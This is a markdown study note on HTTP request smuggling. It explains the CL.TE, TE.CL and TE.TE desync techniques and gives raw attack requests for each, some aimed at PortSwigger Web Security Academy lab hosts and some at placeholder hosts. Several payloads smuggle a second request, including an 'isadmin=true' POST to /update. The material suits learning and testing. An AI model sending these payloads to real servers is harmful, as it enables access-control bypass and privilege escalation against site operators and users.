# HTTP Request smuggling Test
**The most generally effective way to detect HTTP request smuggling vulnerabilities is to send requests that will cause a time delay in the application's responses if a vulnerability is present. This technique is used by Burp Scanner to automate the detection of request smuggling vulnerabilities.**

####  Content-Length and Transfer-Encoding headers, which indicate the end of a request body

* **Content-Length (CL)** 
* **Transfer-Encoding (TE)**


---------------------------

Transfer-Encoding Header
The Transfer-Encoding header is used to specify the form of encoding applied to the message body of an HTTP request or response. A commonly used value for this header is "chunked", indicating that the message body is divided into a series of chunks, each preceded by its size in hexadecimal format. Other possible values for the Transfer-Encoding header include "compress", "deflate", and "gzip", each indicating a different type of encoding. For example:

```http
POST /submit HTTP/1.1
Host: good.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
    
b
q=smuggledData 
0
```
In this example, "b" (in hexadecimal, equivalent to 11 in decimal) specifies the size of the following chunk. The chunk q=smuggledData is the actual data, followed by a new line. The request is terminated with a "0" line, indicating the end of the message body. Each chunk size is given in hexadecimal format, and the end of the chunked body is signified by a chunk of size 0.


------

### headers

```
Content-Length
```

```
Transfer-Encoding: chunked
```

* CL.TE: the front-end server uses the Content-Length header and the back-end server uses the Transfer-Encoding header.
* TE.CL: the front-end server uses the Transfer-Encoding header and the back-end server uses the Content-Length header.
* TE.TE: the front-end and back-end servers both support the Transfer-Encoding header, but one of the servers can be induced not to process it by obfuscating the header in some way.

### HTTP request CL.TE
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```
POST / HTTP/1.1
Host: xxxx.web-security-academy.net
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0


GET /404 HTTP/1.1
X-Ignore: x
```

#### need to include the trailing sequence ` \r\n\r\n ` following the final ` 0 `
```
POST / HTTP/1.1
Host: 0ad900a9041522b281af1b0f001d00e3.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```


## TE.CL Technique
TE.CL stands for Transfer-Encoding/Content-Length.   If an attacker sends a request with both headers, the front-end server or proxy might interpret the request based on the Transfer-Encoding header, while the back-end server might rely on the Content-Length header. This difference in interpretation might interpret the request differently, leading to unexpected behaviour.

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 4
Transfer-Encoding: chunked

78
POST /update HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

isadmin=true
0

```

In the above payload, the front-end server sees the Transfer-Encoding: chunked header and processes the request as chunked. The `78` (**hexadecimal** for `120`) indicates that the next `120` bytes are part of the current request's body. The front-end server considers everything up to the `0 ` (indicating the end of the chunked message) as part of the body of the first request.


------

##  TE.TE Technique 
Transfer Encoding Obfuscation, also known as TE.TE stands for Transfer-Encoding/Transfer-Encoding. 

```http
POST / HTTP/1.1
Host: example.com
Content-length: 4
Transfer-Encoding: chunked
Transfer-Encoding: chunked1

4e
POST /update HTTP/1.1
Host: example.com
Content-length: 15

isadmin=true
0

```

In the above payload, the front-end server encounters two `Transfer-Encoding` headers. The first one is a standard chunked encoding, but the second one, `chunked1`, is non-standard. Depending on its configuration, the front-end server might process the request based on the first `Transfer-Encoding: chunked` header and ignore the malformed `chunked1`, interpreting the entire request up to the `0` as a single chunked message.
